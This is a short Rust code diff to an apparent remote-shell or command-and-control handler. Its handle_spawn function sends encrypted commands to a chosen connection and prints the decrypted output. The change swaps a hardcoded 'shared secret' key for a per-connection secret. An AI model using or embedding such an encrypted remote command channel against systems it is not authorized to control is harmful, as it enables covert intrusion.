@@ -33,6 +33,7 @@ pub async fn handle_spawn(
     }
 
     let (_, connection_info) = active_connections.iter().nth(id).unwrap();
+    let shared_secret = connection_info.shared_secret.clone();
 
     let stream = connection_info.stream.clone();
     let mut stream_lock = stream.lock().await;
@@ -60,12 +61,12 @@ pub async fn handle_spawn(
                 if input.contains("exit") {
                     break;
                 }
-                encrypted_input = encrypt(format!("{}{}", prefix, input).as_bytes(), b"shared secret").expect("Failed to encrypt");
+                encrypted_input = encrypt(format!("{}{}", prefix, input).as_bytes(), &shared_secret).expect("Failed to encrypt");
                 writer.write_all(&encrypted_input).await?;
                 input.clear();
             }
             Ok(_) = reader.read(&mut output) => {
-                decrypted_output = decrypt(&output, b"shared secret").expect("Failed to decrypt");
+                decrypted_output = decrypt(&output, &shared_secret).expect("Failed to decrypt");
                 let mut cmdout = String::from_utf8_lossy(&decrypted_output).to_string();
                 cmdout = cmdout.replace("||cmd||", "");
                 println!("\r{}", cmdout);
